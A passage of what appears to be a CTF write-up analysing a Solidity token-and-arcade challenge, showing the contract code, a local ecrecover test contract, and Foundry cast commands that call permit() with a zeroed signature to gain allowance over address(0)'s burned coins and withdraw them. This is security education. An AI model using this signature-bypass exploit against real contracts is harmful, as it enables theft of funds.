+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">play</span>(<span style="color:#dbbc7f">uint256</span> times) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#859289;font-style:italic">// burn the coins
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>        <span style="color:#d699b6">require</span>(coin.transferFrom(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>), <span style="color:#d699b6">1</span> <span style="color:#e67e80">ether</span> <span style="color:#7a8478">*</span> times));
+</span></span><span style="display:flex;"><span>        <span style="color:#859289;font-style:italic">// Have fun XD
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>It calls transferFrom(src, dst) so it transfer something from sender to address(0) (which is an address with only zero, so it corresponds to no one, its just here like a void, keeping all our gambled coins &hellip;) : <code>0x0000000000000000000000000000000000000000</code>)</p>
+<p>Let&rsquo;s look at <code>transferFrom()</code>:</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">transferFrom</span>(<span style="color:#dbbc7f">address</span> src, <span style="color:#dbbc7f">address</span> dst, <span style="color:#dbbc7f">uint</span> wad)
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">public</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(balanceOf[src] <span style="color:#7a8478">&gt;=</span> wad);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">if</span> (src <span style="color:#7a8478">!=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span> <span style="color:#7a8478">&amp;&amp;</span> allowance[src][<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">!=</span> <span style="color:#d699b6">type</span>(uint256).<span style="color:#d699b6">max</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">require</span>(allowance[src][<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">&gt;=</span> wad);
+</span></span><span style="display:flex;"><span>            allowance[src][<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>] <span style="color:#7a8478">-=</span> wad;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        balanceOf[src] <span style="color:#7a8478">-=</span> wad;
+</span></span><span style="display:flex;"><span>        balanceOf[dst] <span style="color:#7a8478">+=</span> wad;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        emit Transfer(src, dst, wad);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">return</span> <span style="color:#e67e80">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If <code>dst != src</code> and <code>allowance[src][sender]</code> (interpreted as the allowance of the sender on src allowance list) != 115792089237316195423570985008687907853269984665640564039457584007913129639936 (these conditions are skipped in this challenge if you transfer coin from yur account to another account)</p>
+<p>Then it require msg.sender to have enough allowance on src account.
+Meaning that if you want to transfer coins from another account you&rsquo;re not the owner, you have to be allowed to transfer a certain amount. And this amount is stored in <code>allowance</code> mapping (Coin.sol:line 23).</p>
+<p>So it transfers coin from <code>src</code> account to <code>dst</code> account (and if src != msg.sender, substract the value to transfer from msg.sender allowance on allowance[src][msg.sender] so we can&rsquo;t transfer an infinite amount) and then substract the transferred amount from <code>src</code> coin balance and increase <code>dst</code> balance.</p>
+<p>Then, <code>play(uint256 times)</code> function transfer 1 ether == 10**18 * times to msg.sender coin balance to address(0) coin balance. So you&rsquo;re coin balance needs to have at least 10^18 coins.</p>
+<p>From the challenge scenario, <code>play(19)</code> is used at setup that&rsquo;s why there is a comment saying people played before us.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>() <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        coin <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> Coin();
+</span></span><span style="display:flex;"><span>        arcadeMachine <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> ArcadeMachine(coin);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#859289;font-style:italic">// Assume that many people have played before you ;)
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">==</span> <span style="color:#d699b6">20</span> <span style="color:#e67e80">ether</span>);
+</span></span><span style="display:flex;"><span>        coin.deposit{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">20</span> <span style="color:#e67e80">ether</span>}();
+</span></span><span style="display:flex;"><span>        coin.approve(<span style="color:#dbbc7f">address</span>(arcadeMachine), <span style="color:#d699b6">19</span> <span style="color:#e67e80">ether</span>);
+</span></span><span style="display:flex;"><span>        arcadeMachine.play(<span style="color:#d699b6">19</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So, address(0) got a balance of 19 * 10**18 coins, which will makes 19 ether if they are withdrawn.</p>
+<p>To get these we need to find a way to transfer coins from address(0) balance to our balance using <code>transferFrom()</code>, for that we need to have an allowance amount superior or equal to the value we want to transfer and then withdraw them.</p>
+<p>To make short, we have two interesting functions, <code>privilegeWithdraw</code> and <code>permit</code>.</p>
+<p>The first one transfer address(0) coin to msg.sender but we need to be the owner of the contract so it sucks.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">privilegedWithdraw</span>() onlyOwner <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint</span> wad <span style="color:#7a8478">=</span> balanceOf[<span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>)];
+</span></span><span style="display:flex;"><span>        balanceOf[<span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">0</span>)] <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#e67e80">payable</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>).<span style="color:#d699b6">transfer</span>(wad);
+</span></span><span style="display:flex;"><span>        emit PrivilegedWithdrawal(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>, wad);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The second one allow us to set allowance value for a <code>spender</code> address on <code>owner</code> address if we manage to confirm that <code>spender</code> is the <code>owner</code> (specified in the function, not the contract owner) by verifiying a signature with ecdsa.</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span> <span style="color:#e67e80">function</span> <span style="color:#b2c98f">permit</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">address</span> owner,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">address</span> spender,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> <span style="color:#d699b6">value</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint256</span> deadline,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">uint8</span> v,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes32</span> r,
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes32</span> s
+</span></span><span style="display:flex;"><span>    ) <span style="color:#e67e80">external</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">block</span>.<span style="color:#d699b6">timestamp</span> <span style="color:#7a8478">&lt;=</span> deadline, <span style="color:#b2c98f">&#34;signature expired&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes32</span> structHash <span style="color:#7a8478">=</span> <span style="color:#d699b6">keccak256</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#d699b6">abi</span>.<span style="color:#d699b6">encode</span>(PERMIT_TYPEHASH, owner, spender, <span style="color:#d699b6">value</span>, nonces[owner]<span style="color:#7a8478">++</span>, deadline)
+</span></span><span style="display:flex;"><span>        );
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">bytes32</span> h <span style="color:#7a8478">=</span> _hashTypedDataV4(structHash);
+</span></span><span style="display:flex;"><span>        <span style="color:#dbbc7f">address</span> signer <span style="color:#7a8478">=</span> <span style="color:#d699b6">ecrecover</span>(h, v, r, s);
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(signer <span style="color:#7a8478">==</span> owner, <span style="color:#b2c98f">&#34;invalid signer&#34;</span>);
+</span></span><span style="display:flex;"><span>        allowance[owner][spender] <span style="color:#7a8478">=</span> <span style="color:#d699b6">value</span>;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>So we need to have <code>signer == owner</code> meaning : <code>ecrecover(h,v,r,s) == 0x0000000000000000000000000000000000000000</code></p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>Here the vulnerability is that we can choose the v, r and s parameter in order to get a null signature.</p>
+<p>Testing <code>ecrecover()</code> locally i found that with any <code>h</code> if <code>v = r = s = 0</code> , then <code>ecrecover(h,v,r,s) == 0 == address(0)</code></p>
+<p>With this test contract :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">25</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> Testsignatures {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bytes32</span> <span style="color:#e67e80">public</span> hash <span style="color:#7a8478">=</span> <span style="color:#d699b6">0x24c36029f1c6a76aeef30e9ab8c3eeacb5609cc1ee2962e660ce2313c5696c4a</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> <span style="color:#e67e80">public</span> v <span style="color:#7a8478">=</span> <span style="color:#d699b6">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bytes32</span> <span style="color:#e67e80">public</span> r <span style="color:#7a8478">=</span> <span style="color:#d699b6">0x0000000000000000000000000000000000000000000000000000000000000000</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">bytes32</span> <span style="color:#e67e80">public</span> s <span style="color:#7a8478">=</span> <span style="color:#d699b6">0x0000000000000000000000000000000000000000000000000000000000000000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">public</span> signer <span style="color:#7a8478">=</span> <span style="color:#d699b6">0x55EB72D6588c64E202AA006b4Ea380275E9A4B25</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">sign</span>() <span style="color:#e67e80">public</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        signer <span style="color:#7a8478">=</span> <span style="color:#d699b6">ecrecover</span>(hash, v, r, s);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="solving">Solving</h1>
+<p>So finally we need to :</p>
+<ul>
+<li>register</li>
+<li>call permit() with these args:<code>owner=address(0), spender=our_address, value=19*10**18, deadline=timestamp, v=0, r=0 and s=0</code></li>
+<li>transfer coins</li>
+<li>withdraw</li>
+<li>get the flag</li>
+</ul>
+<p>With <a href="https://book.getfoundry.sh/reference/cast/">cast</a> :</p>
+<p>calling permit : <code>cast send -r $RPC --private-key $PKEY $COIN &quot;permit(address,address,uint256,uint256,uint8,bytes32,bytes32)&quot; $(cast address-zero) $ADDRESS 18000000000000000000 1732416543 0 $(cast to-bytes32 0) $(cast to-bytes32 0)</code></p>
+<p>I can now check my allowance on address(0) allowance mapping : <code>cast call $COIN -r $RPC &quot;allowance(address, address)(uint)&quot; $(cast address-zero) $ADDRESS</code> -&gt; 1.8e+19</p>
+<p>I now transfer my self the coin : <code>cast send -r $RPC --private-key $PKEY $COIN &quot;transferFrom(address,address,uint256)&quot; $(cast address-zero) $ADDRESS 18000000000000000000</code></p>
+<p>And withdraw them : <code>cast send $COIN -r $RPC --private-key $PKEY &quot;withdraw(uint)&quot; 18000000000000000000</code> -&gt; 18.999999999999776957</p>
+<p>Now i can interact with instance, submit my uuid and get the flag : <code>SEKAI{0wn3r:wh3r3_4r3_mY_c01n5_:&lt;}</code></p>
+<h1 id="references">References</h1>
+<p><a href="https://docs.soliditylang.org/en/latest/solidity-by-example.html#recovering-the-message-signer-in-solidity">https://docs.soliditylang.org/en/latest/solidity-by-example.html#recovering-the-message-signer-in-solidity</a></p>
+</article>
+
+            </div>
+        </main>
+
+  
+    </body>
+</html>
